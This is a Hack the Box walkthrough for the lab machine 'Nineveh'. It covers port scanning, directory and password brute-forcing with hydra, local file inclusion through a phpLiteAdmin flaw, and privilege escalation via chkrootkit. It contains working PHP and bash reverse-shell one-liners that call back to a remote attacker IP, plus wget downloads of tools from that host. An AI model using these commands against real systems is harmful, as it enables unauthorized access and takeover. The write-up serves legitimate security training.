# Hack the Box - Nineveh

```
Vulnerabilities:
  - Local File Inclusion
  - chkrootkit
```
## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.43 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.43
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```

```CSS
▶ nmap -sC -sV -p 80,443 10.10.10.43 -oN deep.nmap

Nmap scan report for 10.10.10.43
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

---

## HTTP
![image](https://user-images.githubusercontent.com/83878909/234479646-7b054e0f-a213-479e-9a80-3d63bdcbb1ef.png)

---

## HTTPS/SSL
![image](https://user-images.githubusercontent.com/83878909/234479727-ccec4c69-ee5a-4d14-b0ac-20744987d630.png)

## SSL Certificate Information
```CSS
▶ openssl s_client -connect nineveh.htb:443
```
![image](https://user-images.githubusercontent.com/83878909/234488440-5c959a74-496a-48b6-87c9-8ff1ddb0ad47.png)

---

## Content Discovery
  - Directory brute-force - `http://nineveh.htb`
```CSS
▶ gobuster dir -u nineveh.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![image](https://user-images.githubusercontent.com/83878909/234485858-a451bd36-d418-447e-924a-bdecc2cd8c61.png)
![image](https://user-images.githubusercontent.com/83878909/234485999-3f3e259c-2a1d-420a-ac1f-4a41b74b2480.png)

  - Directory brute-force - `https://nineveh.htb`
```CSS
▶ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-tls-validation
```
![image](https://user-images.githubusercontent.com/83878909/234487716-3c05a713-9514-4b7e-848f-5686b58b320b.png)
![image](https://user-images.githubusercontent.com/83878909/234484978-13d104de-2e36-46c6-8f17-fbb217cf826e.png)

---

## Brute-force Credentials
  - Page: `http://nineveh.htb/department/login.php`
```CSS
▶ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 60
```
![image](https://user-images.githubusercontent.com/83878909/234488924-25dd7cb9-7e32-4297-a545-3f04f699c6f7.png)
```CSS
Credentials: admin:1q2w3e4r5t
```

  - Page: `https://nineveh.htb/db/index.php`
```CSS
▶ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 60
```
![image](https://user-images.githubusercontent.com/83878909/234490465-5b8c57b0-03c2-4385-b2cc-a8bff186fdd9.png)
```CSS
Credentials: admin:password123
```
---
  - Home: `http://nineveh.htb/department/manage.php`
![image](https://user-images.githubusercontent.com/83878909/234503125-7b01ee2d-05ab-4a4d-99c3-34203400bef2.png)

  - Notes: `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
![image](https://user-images.githubusercontent.com/83878909/234503429-75a2e5b6-f739-4093-b2c2-b137aea0dd91.png)

---

  - Dashboard: `https://nineveh.htb/db/index.php`
![image](https://user-images.githubusercontent.com/83878909/234558464-b656bd0d-0942-4420-8e46-bbfbb833705f.png)

---

## Local File Inclusion(LFI)
  - URL: `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
![image](https://user-images.githubusercontent.com/83878909/234561596-3375a5a2-0015-448b-807c-2a5fb42aca58.png)
![image](https://user-images.githubusercontent.com/83878909/234561294-8c2c1a9c-db43-4dc6-baa3-9c53d31d8287.png)
![image](https://user-images.githubusercontent.com/83878909/234562592-182e614e-0287-4ba9-b0ff-6e1f9c626744.png)

## Searchsploit
```CSS
▶ searchsploit phpLiteAdmin
```
![image](https://user-images.githubusercontent.com/83878909/234558865-27ea3b54-64e7-4c1a-8ab4-527e8278b051.png)
![image](https://user-images.githubusercontent.com/83878909/234563586-f21678b1-c036-4f66-81b4-31cf99ad8690.png)
![image](https://user-images.githubusercontent.com/83878909/234564279-94bf032a-8eec-4587-a5ca-57939c4c2cc6.png)
![image](https://user-images.githubusercontent.com/83878909/234564484-13d373a3-d688-4fd8-b547-ef36d506ad93.png)
![image](https://user-images.githubusercontent.com/83878909/234564717-f30a4d82-67af-4659-a772-c09fcdb3fffc.png)

## Exploit Local File Inclusion
![image](https://user-images.githubusercontent.com/83878909/234565248-8cece311-7f2c-4c84-b335-e9eec6a6ff82.png)
![image](https://user-images.githubusercontent.com/83878909/234565557-3f97fa6b-65ac-4368-922f-00798fd18f5f.png)


## Initial Foothold
  - Reverse Shell
```CSS
php -r '$sock=fsockopen("10.10.14.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![image](https://user-images.githubusercontent.com/83878909/234566958-ed5cc483-b3da-4cbd-b3f2-74a35ea013d7.png)
![image](https://user-images.githubusercontent.com/83878909/234567122-be3e8c54-0a79-4f54-b322-fa634f4d4289.png)
![image](https://user-images.githubusercontent.com/83878909/234599268-11fda74f-c812-4db5-ac75-450adb9320d4.png)

---

## Privilege Escalation
  - Upload `LinEnum.sh`.
```CSS
▶ cd /tmp
▶ wget http://10.10.14.12:5555/LinEnum.sh
▶ chmod +x LinEnum.sh
▶ ./LinEnum.sh
```

![image](https://user-images.githubusercontent.com/83878909/234602152-b1fe2633-a9bc-482a-8cb8-6d7a81accf96.png)
![image](https://user-images.githubusercontent.com/83878909/234601719-41e0eb4b-49ff-49a5-8ae4-898acc8d58cc.png)

![image](https://user-images.githubusercontent.com/83878909/234607621-64dbdecb-5d29-43ce-a0cf-0d7072cd3c55.png)

  - Upload `pspy64`
```CSS
▶ wget http://10.10.14.12:5555/pspy64
▶ chmod +x pspy64
▶ ./pspy64
```
![image](https://user-images.githubusercontent.com/83878909/234611389-ee33c978-c1c2-4022-a3f6-7bb715338377.png)
![image](https://user-images.githubusercontent.com/83878909/234611136-f13ee9a3-14b6-4b70-b39c-5d9c891e8d23.png)

![image](https://user-images.githubusercontent.com/83878909/234613642-752c8e5c-3627-4b75-ac35-c4df4ae970c9.png)

  - [Local Privilege Escalation - chkrootkit](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
  - File `/tmp/update`.
![image](https://user-images.githubusercontent.com/83878909/234626907-67a484f8-2f0c-40f9-99a9-0774d4558190.png)

```CSS
▶ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.25/443 0>&1' > update
```
```CSS
▶ chmod +x update
```
![image](https://user-images.githubusercontent.com/83878909/234643255-71371280-116e-49ed-8584-e7aa1d48dd59.png)
